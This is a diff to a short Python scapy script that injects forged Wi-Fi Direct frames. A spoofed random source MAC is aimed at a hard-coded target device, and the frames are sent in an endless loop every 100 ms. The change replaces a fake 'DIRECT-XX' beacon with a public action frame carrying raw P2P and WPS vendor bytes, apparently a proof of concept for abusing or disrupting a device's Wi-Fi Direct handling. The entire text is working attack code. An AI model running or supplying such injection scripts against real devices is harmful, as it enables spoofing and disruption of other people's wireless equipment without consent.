@@ -1,10 +1,13 @@
 from scapy.all import *
 
-iface = 'wlp4s0mon'           # interface in monitor mode
-target = 'ac:04:0b:e9:30:69'  # target MAC address
+iface = 'wlan0'           # interface in monitor mode
+target = '52:68:0a:09:28:e1'  # target MAC address
 mac = RandMAC()               # (fake) mac address of source 
 
 dot11 = Dot11FCS(addr1=target, addr2=mac)
+action = Dot11Action(category='Public')
+raw = Raw(load=b'\x09\x50\x6f\x9a\x09\x07\x01')
+wps = Raw(load=b'\xdd\x0a\x00\x50\xf2\x04\x10\x08\x00\x02\x00\x80')
 beacon = Dot11Beacon(cap='ESS+privacy')
 essid = Dot11Elt(ID='SSID', info='DIRECT-XX') # DIRECT- SSID for WFD
 rates = Dot11Elt(ID='Rates', info=b"\x48")    # rate of monitor mode iface
@@ -39,5 +42,6 @@ p2p = Dot11EltVendorSpecific(oui=0x506f9a, info=(
     group))                          # group client data
 
 # assemble and send packet
-packet = RadioTap()/dot11/beacon/essid/rates/rsn/p2p
+# packet = RadioTap()/dot11/beacon/essid/rates/rsn/p2p
+packet = RadioTap()/dot11/action/raw/p2p/wps
 sendp(packet, iface=iface, inter=0.100, loop=1)
